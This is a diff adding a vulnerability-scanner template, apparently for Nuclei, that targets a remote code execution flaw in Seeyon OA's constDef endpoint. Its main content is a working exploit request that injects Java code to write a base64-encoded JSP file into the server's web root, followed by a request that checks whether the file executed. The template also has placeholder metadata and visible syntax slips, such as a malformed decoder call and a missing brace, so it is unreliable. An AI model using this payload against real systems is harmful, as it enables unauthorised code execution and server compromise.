@@ -1,0 +1,23 @@
+id: seeyon-constDefdo-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 致远constDef接囗存在代码执行漏洞
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/constDefdo?method=newConstDef&constKey=asdasd&constDefine=$demo%20%22;new%20File(%22./webapps/ROOT/{{filename}}.jsp%22).write(new%20String(Base64.getDecoder0.decode%22PCUgb3V0LnByaW50bG4obmV3IFN0cmluZyhuZXcgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcigpLmRlY29kZUJ1ZmZlcigiWlRFMk5UUXlNVEV4TUdKaE1ETXdPVGxoTVdNd016a3pNemN6WXpWaU5ETT0iKSkpOyBuZXcgamF2YS5pby5GaWxlKGFwcGxpY2F0aW9uLmdldFJlYWxQYXRoKHJlcXVlc3QuZ2V0U2VydmxldFBhdGgoKSkpLmRlbGV0ZSgpOyU+%22));%22&constDescription=123&constType=4"
+      - "{{BaseURL}}/{filename}}.jsp"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
